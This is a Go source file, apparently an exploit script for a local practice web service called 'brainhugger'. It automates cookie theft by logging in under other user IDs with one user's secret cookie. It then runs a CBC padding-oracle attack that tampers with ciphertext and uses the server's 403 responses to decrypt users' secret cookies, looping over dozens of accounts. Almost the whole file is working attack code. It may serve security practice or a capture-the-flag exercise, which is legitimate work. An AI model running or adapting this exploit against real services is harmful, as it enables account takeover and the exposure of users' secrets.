package main

import (
	"brainhugger/backend/cbc"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"strings"
	"sync"
)

type Task struct {
	Source string
	Stdin  string
	Token  string
	OwnerId uint
}

type User struct {
	Password string
}

type LoginUser struct {
	UserId   uint
	Password string
}

func addNewTask(wg *sync.WaitGroup, source, stdin, token string, owner uint) []byte {
	defer wg.Done()
	task := Task{
		Source:  source,
		Stdin:   stdin,
		Token:   token,
		OwnerId: owner,
	}
	data, err := json.Marshal(task)
	if err != nil {
		panic("can not marshal task: " + err.Error())
	}
	resp, err := http.Post("http://0.0.0.0:8080/run_task", "json", bytes.NewReader(data))
	if err != nil {
		panic("can not make post-request: " + err.Error())
	}
	if resp.StatusCode != 200 {
		panic(fmt.Sprintf("status code: %v", resp.StatusCode))
	}
	res, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic("can not read body: " + err.Error())
	}
	return res
}

func addNewUser(wg *sync.WaitGroup, password string) []byte {
	defer wg.Done()
	user := User{
		Password: password,
	}
	data, err := json.Marshal(user)
	if err != nil {
		panic("can not marshal task: " + err.Error())
	}
	resp, err := http.Post("http://0.0.0.0:8080/register", "json", bytes.NewReader(data))
	if err != nil {
		panic("can not make post-request: " + err.Error())
	}
	if resp.StatusCode != 200 {
		panic(fmt.Sprintf("status code: %v", resp.StatusCode))
	}
	res, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic("can not read body: " + err.Error())
	}
	return res
}

func stealCookie(secret string, cookieUserId, desiredCookieId uint) string {
	loginUser := LoginUser{
		UserId: desiredCookieId,
		Password: "randomstring",
	}
	data, err := json.Marshal(loginUser)
	if err != nil {
		panic("can not marshal task: " + err.Error())
	}
	req, err := http.NewRequest("POST", "http://localhost:8080/login", bytes.NewReader(data))
	if err != nil {
		panic("can not create request: " + err.Error())
	}
	req.AddCookie(&http.Cookie{Name: "secret", Value: secret})
	req.AddCookie(&http.Cookie{Name: "uid", Value: fmt.Sprint(cookieUserId)})
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic("can not do request: " + err.Error())
	}
	for _, cookie := range resp.Cookies() {
		if cookie.Name == "secret" {
			fmt.Println("Cookie was stolen: ", cookie.Value)
			return cookie.Value
		}
	}
	panic(fmt.Sprintf("response has no cookies: %v", resp.Cookies()))
}

func tryDecr(userId uint, encrypted []byte) bool {
	secretB64 := base64.StdEncoding.EncodeToString(encrypted)
	req, err := http.NewRequest("GET", "http://localhost:8080/task_info/0", nil)
	if err != nil {
		panic("can not create request: " + err.Error())
	}
	req.AddCookie(&http.Cookie{Name: "secret", Value: secretB64})
	req.AddCookie(&http.Cookie{Name: "uid", Value: fmt.Sprint(userId)})
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic("can not do request: " + err.Error())
	}
	return resp.StatusCode == 403
}

func paddingOracleAttackBlock(userId uint, leftBlock, rightBlock []byte) string {
	count := 0

	encrypted := make([]byte, len(leftBlock) + len(rightBlock))
	encryptedCopy := make([]byte, len(leftBlock) + len(rightBlock))
	copy(encrypted[:16], leftBlock)
	copy(encrypted[16:], rightBlock)
	copy(encryptedCopy[:16], leftBlock)
	copy(encryptedCopy[16:], rightBlock)

	result := make([]byte, 16)
	i2 := make([]byte, 16)
	for k := 1; k < 17; k++ {
		for j := 0; j < k - 1; j++ {
			encrypted[15 - j] = i2[15 - j] ^ byte(k)
		}
		for i := 0; i < 256; i++ {
			if _, err1 := rand.Read(encrypted[:16 - k]); err1 != nil {
				panic(err1)
			}
			encrypted[16 - k] = byte(i)
			count++
			if tryDecr(userId, encrypted) {
				i2[16 - k] = byte(i) ^ byte(k)
				result[16 - k] = i2[16 - k] ^ encryptedCopy[16 - k]
				break
			}
		}
	}
	if result[len(result)-1] > 0 && result[len(result)-1] < 16 {
		return string(result[:16-result[len(result)-1]])
	}
	return string(result)
}

func paddingOracleAttack(secret string, userId uint) string {
	fullSecret, err := base64.StdEncoding.DecodeString(secret)
	if len(fullSecret)%16 != 0 {
		panic(fmt.Sprintf("invalid secret size: %v", len(fullSecret)))
	}
	blocksCount := len(fullSecret) / 16
	fmt.Println("Blocks count: ", blocksCount)
	fmt.Print("Getting blocks... 1 ")
	if err != nil {
		panic("Can not decode base64: " + err.Error())
	}
	var result strings.Builder
	result.WriteString(paddingOracleAttackBlock(userId, cbc.InitVector, fullSecret[:16]))

	for i := 1; i < blocksCount; i++ {
		fmt.Print(i + 1, " ")
		result.WriteString(paddingOracleAttackBlock(userId, fullSecret[i*16-16:i*16], fullSecret[i*16:i*16+16]))
	}
	fmt.Println("ok!")
	return result.String()
}

func examplePOA(secret string, cookieUserId, desiredUserId uint) {
	realSecret := stealCookie(secret, cookieUserId, desiredUserId)
	fmt.Println(len(realSecret))
	if len(realSecret) != 64 {
		return
	}
	plainSecret := paddingOracleAttack(realSecret, desiredUserId)
	fmt.Printf("Plain secret: '%v'\n", plainSecret)
}

func main() {
	for i := 10; i < 70; i++ {
		examplePOA("X8pieqciaGwScCfFVYUQIA==", 80, uint(i))
	}
}
